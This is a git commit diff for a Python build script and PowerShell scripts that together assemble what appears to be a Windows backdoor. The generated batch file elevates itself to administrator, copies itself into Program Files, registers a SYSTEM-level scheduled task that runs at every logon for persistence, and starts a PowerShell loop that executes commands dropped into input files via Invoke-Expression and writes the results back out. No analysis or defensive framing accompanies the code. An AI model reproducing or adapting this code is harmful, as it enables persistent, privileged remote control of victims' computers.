e8bdfd3b542036c6e4548b43679818bd1414d7e4
lexert <dominikch19@gmail.com>
2021-02-24 12:22:43 +0100

    fixed

--- buildPSIntoBat.py
+++ buildPSIntoBat.py
@@ -1,31 +1,35 @@
 socketBat = open("socket.bat", "w")
 
-socketBat.write("@echo off \n");
-socketBat.write("if not \"%1\"==\"am_admin\" (powershell start -verb runas '%0' am_admin & exit /b) \n");
-socketBat.write("start powershell -windowstyle hidden -Command \"");
+socketBat.write("@echo off \r\n");
+socketBat.write("if not \"%1\"==\"am_admin\" (powershell start -verb runas '%0' am_admin & exit /b) \r\n");
+
+socketBat.write("mkdir C:\\\"Program Files\"\\AAA\r\n")
+socketBat.write("copy %0 C:\\\"Program Files\"\\AAA\\ \r\n")
+socketBat.write("schtasks /create /F /ru \"SYSTEM\" /sc onlogon /tn BatSocket /rl highest /tr \"\\\"C:\\Program Files\\AAA\\socket.bat\"\\\" \r\n")
+# /ru \"SYSTEM\"
+socketBat.write("start powershell -Command \"");
 #-windowstyle hidden
-socketRaw = open("socketRaw.ps1", "r")
+socket = open("socket.ps1", "r")
 executor = open("executor.ps1", "r")
 
 while 1: 
-    # read by character 
-    char = socketRaw.read(1)           
+    char = socket.read(1)           
     if not char: 
-        socketBat.write('"\n')
+        socketBat.write('"\r\n')
         break
     if char != '\n':      
         socketBat.write(char)
 
-socketBat.write("start powershell -windowstyle hidden -Command \"");
+socketBat.write("start powershell -Command \"");
 while 1:
     char = executor.read(1)  
     if not char: 
-        socketBat.write('"\n')
+        socketBat.write('"\r\n')
         break 
     if char != '\n':      
         socketBat.write(char)   
 
-socketBat.write("pause \n");
+socketBat.write("pause \r\n");
 socketBat.close()
-socketRaw.close()
+socket.close()
 executor.close()
--- executor.ps1
+++ executor.ps1
@@ -2,23 +2,29 @@ $counterInput = 0;
 $counterOutput = 0;
 
 while (1) {
-    $path = -join('C:\input',$counterInput, '.txt');
+    $path = -join('C:\Program Files\AAA\input',$counterInput, '.txt');
     
-    $input = Get-Content $path;
-    if($input.length -ge 1){
-        $outputPath = -join('C:\output', $counterOutput, '.txt');
 
-        Write-Host $input;   
-        $command = Get-Content $path;
-        $output = Invoke-Expression $command;
-        Foreach($s in $output){
-            Add-Content -Path $outputPath -Value $s;
+    if(Test-Path $path){
+
+        $input = Get-Content $path;
+        if($input.length -ge 1){
+            $outputPath = -join('C:\Program Files\AAA\output', $counterOutput, '.txt');
+
+            $output = Invoke-Expression $input;
+            $joinedOutput = '';
+            Foreach($s in $output){
+                $joinedOutput+= $s;
+                $joinedOutput+=[environment]::NewLine;
+            };
+            Set-Content -Path $outputPath -Value $joinedOutput;
         };
+        
         $counterInput+=1;
-        $counterOutput+=0;
+        $counterOutput+=1;
         Remove-Item $path;
     };
     
     
-    start-sleep -Milliseconds 500;
+    start-sleep -Milliseconds 120;
 };
